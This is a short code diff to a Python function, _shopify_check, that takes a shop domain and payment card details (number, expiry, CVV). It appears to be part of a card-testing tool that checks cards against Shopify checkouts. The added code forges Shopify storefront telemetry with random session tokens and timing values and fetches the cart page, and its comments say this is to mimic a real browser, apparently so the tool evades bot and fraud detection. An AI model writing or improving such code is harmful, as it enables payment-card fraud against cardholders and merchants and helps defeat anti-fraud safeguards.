@@ -383,6 +383,35 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     except Exception:
         return None, "Failed to add to cart", gw_name, None
 
+    # Send monorail telemetry (simulates real browser behavior)
+    try:
+        monorail_url = f"{base_url}/.well-known/shopify/monorail/v1/produce"
+        monorail_payload = {
+            "schema_id": "perf_kit_on_interaction/3.2",
+            "payload": {
+                "url": f"{base_url}/collections/all", "page_type": "product",
+                "shop_id": int(shop_id) if shop_id else 25603230,
+                "application": "storefront-renderer",
+                "session_token": str(uuid.uuid4()),
+                "unique_token": str(uuid.uuid4()),
+                "micro_session_id": str(uuid.uuid4()).upper(),
+                "micro_session_count": 1,
+                "interaction_to_next_paint": random.randint(30, 80),
+                "seo_bot": False, "referrer": base_url,
+                "worker_start": 0, "next_hop_protocol": "h3"
+            },
+            "metadata": {"event_created_at_ms": int(time.time() * 1000), "event_sent_at_ms": int(time.time() * 1000)}
+        }
+        await client.post(monorail_url, json=monorail_payload, headers={'Content-Type': 'text/plain', 'Origin': base_url, 'User-Agent': UA}, timeout=httpx.Timeout(5))
+    except:
+        pass
+
+    # View cart page (simulates browser navigation)
+    try:
+        await client.get(f"{base_url}/cart", headers={'Accept': 'text/html', 'User-Agent': UA}, timeout=httpx.Timeout(5))
+    except:
+        pass
+
     # Step 3: Create checkout
     ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9'}
     try:
